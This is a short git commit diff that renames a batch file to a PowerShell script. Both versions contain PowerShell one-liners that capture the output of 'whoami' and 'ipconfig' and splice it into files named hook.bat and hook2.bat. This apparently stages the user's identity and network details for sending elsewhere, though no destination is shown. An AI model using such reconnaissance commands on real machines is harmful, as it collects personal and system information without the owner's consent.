723f817b9bbb5e6f65cad31871220a93885db2d1
PxINKY <45299920+PxINKY@users.noreply.github.com>
2022-04-19 04:49:57 -0700

    Update and rename run2.bat to run2.ps1

--- run2.bat
+++
@@ -1,2 +0,0 @@
-powershell -command $w=(whoami) -replace '\\'; "(gc .\hook.bat) -replace '=', $w | Out-File -encoding ASCII hook.bat"
-powershell -command $ip=(ipconfig); "(gc .\hook2.bat) -replace '=', $ip | Out-File -encoding ASCII hook2.bat"
---
+++ run2.ps1
@@ -0,0 +1,2 @@
+powershell -command $w=(whoami) -replace '\\'; "(gc hook.bat) -replace '=', $w | Out-File -encoding ASCII hook.bat"
+powershell -command $ip=(ipconfig); "(gc hook2.bat) -replace '=', $ip | Out-File -encoding ASCII hook2.bat"
